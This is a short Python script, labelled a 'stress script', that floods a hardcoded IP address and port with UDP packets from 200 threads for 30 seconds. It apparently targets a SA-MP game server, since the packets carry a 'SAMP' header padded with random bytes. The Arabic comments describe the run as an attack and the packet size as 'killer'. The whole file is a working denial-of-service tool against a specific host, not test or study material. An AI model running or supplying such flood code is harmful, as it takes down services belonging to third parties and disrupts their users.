import socket
import threading
import time
import os
import sys

# =====================================================================
# === TRAPKING LEMEHOST STANDALONE STRESS SCRIPT ===
# =====================================================================

TARGET_IP = "51.68.107.75"
TARGET_PORT = 19122
THREADS_COUNT = 200  # عدد المسارات المكثفة داخل الهوست
DURATION = 30        # مدة الهجوم بالثواني

def worker_routine():
    end_time = time.time() + DURATION
    # الحجم القاتل 1450 بايت لضرب النواة مباشرة بدون تجزئة
    payload = b"SAMP" + socket.inet_aton(TARGET_IP) + TARGET_PORT.to_bytes(2, 'little') + os.urandom(1442)
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
    except:
        pass

    while time.time() < end_time:
        try:
            for _ in range(100):
                sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            try:
                sock.close()
            except:
                pass
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        sock.close()
    except:
        pass

def main():
    print(f"[*] Starting Standalone Engine on Target -> {TARGET_IP}:{TARGET_PORT}")
    threads = []
    
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=worker_routine)
        t.daemon = True
        threads.append(t)
        t.start()

    start_time = time.time()
    while time.time() - start_time < DURATION:
        time.sleep(1)

    print("[+] Execution finished.")

if __name__ == "__main__":
    main()
    
